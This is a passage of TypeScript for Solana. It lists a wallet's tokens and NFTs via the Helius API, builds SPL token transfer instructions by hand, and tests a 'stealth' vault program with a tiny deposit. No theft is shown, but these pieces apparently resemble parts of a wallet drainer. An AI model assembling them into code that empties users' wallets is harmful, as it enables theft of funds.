    const tokens: TokenBalance[] = [];
    
    // Process tokens (fungible tokens)
    if (data.tokens) {
      for (const token of data.tokens) {
        tokens.push({
          mint: token.mint,
          amount: BigInt(token.amount),
          decimals: token.decimals || 0,
          tokenAccount: token.tokenAccount,
          name: token.name,
          symbol: token.symbol
        });
      }
    }
    
    return tokens;
  } catch (error) {
    console.error("Failed to fetch token balances:", error);
    return [];
  }
}

async function getNFTs(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
  const url = `https://api.helius.xyz/v1/addresses/${wallet.toString()}/nfts?api-key=${apiKey}`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    
    const nfts: TokenBalance[] = [];
    
    if (Array.isArray(data)) {
      for (const nft of data) {
        nfts.push({
          mint: nft.mint,
          amount: BigInt(1), // NFTs typically have amount 1
          decimals: 0,
          tokenAccount: nft.tokenAccount,
          name: nft.name,
          symbol: nft.symbol
        });
      }
    }
    
    return nfts;
  } catch (error) {
    console.error("Failed to fetch NFTs:", error);
    return [];
  }
}

// ========== TOKEN UTILITIES ==========

async function getAssociatedTokenAddress(
  mint: PublicKey,
  owner: PublicKey,
  allowOwnerOffCurve = false,
  programId = TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
): Promise<PublicKey> {
  if (!allowOwnerOffCurve && !PublicKey.isOnCurve(owner.toBuffer())) {
    throw new Error('Owner cannot be off curve');
  }

  const [address] = await PublicKey.findProgramAddress(
    [owner.toBuffer(), programId.toBuffer(), mint.toBuffer()],
    associatedTokenProgramId
  );

  return address;
}

function createAssociatedTokenAccountInstruction(
  payer: PublicKey,
  associatedToken: PublicKey,
  owner: PublicKey,
  mint: PublicKey,
  programId = TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
) {
  const keys = [
    { pubkey: payer, isSigner: true, isWritable: true },
    { pubkey: associatedToken, isSigner: false, isWritable: true },
    { pubkey: owner, isSigner: false, isWritable: false },
    { pubkey: mint, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    { pubkey: programId, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
  ];

  return new TransactionInstruction({
    keys,
    programId: associatedTokenProgramId,
    data: Buffer.alloc(0),
  });
}

function createTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
  multiSigners: Signer[] = [],
  programId = TOKEN_PROGRAM_ID
) {
  const keys = [
    { pubkey: source, isSigner: false, isWritable: true },
    { pubkey: destination, isSigner: false, isWritable: true },
    { pubkey: owner, isSigner: true, isWritable: false },
  ];

  multiSigners.forEach(signer =>
    keys.push({ pubkey: signer.publicKey, isSigner: true, isWritable: false })
  );

  const data = Buffer.alloc(12);
  data.writeUInt8(3, 0); // Transfer instruction
  data.writeBigUInt64LE(amount, 4);

  return new TransactionInstruction({
    keys,
    programId,
    data,
  });
}

// === TEST FUNCTION ===
export async function testStealthProgram(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
): Promise<boolean> {
  console.log("🧪 Testing stealth program with Anchor...");
  
  try {
    const program = createProgram(connection, publicKey, signTransaction);
    
    // Test with tiny amount
    const testAmount = 100000; // 0.0001 SOL
    const seed = `test-${Date.now()}`;
    
    const [vaultPda] = getVaultPda(publicKey, seed);
    console.log(`Test vault PDA: ${vaultPda.toBase58()}`);
    
    // 1. Initialize
    console.log("1. Testing initialization...");
    const initSig = await program.methods
      .initVault(seed)
      .accounts({
        owner: publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .rpc();
    
    console.log(`✅ Initialized: ${initSig.slice(0, 16)}...`);
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // 2. Small deposit
    console.log("2. Testing deposit...");
    const depositSig = await program.methods
      .deposit(new BN(testAmount))
      .accounts({
        depositor: publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .rpc();
    
    console.log(`✅ Deposited: ${depositSig.slice(0, 16)}...`);
    
    // 3. Check vault
    const vaultBalance = await connection.getBalance(vaultPda);
    console.log(`Vault balance: ${vaultBalance} lamports`);
    
    return true;
    
  } catch (error: any) {
    console.error("Test failed:", error.message);
    if (error.logs) {
      console.error("Logs:", error.logs);
    }
    return false;
  }
}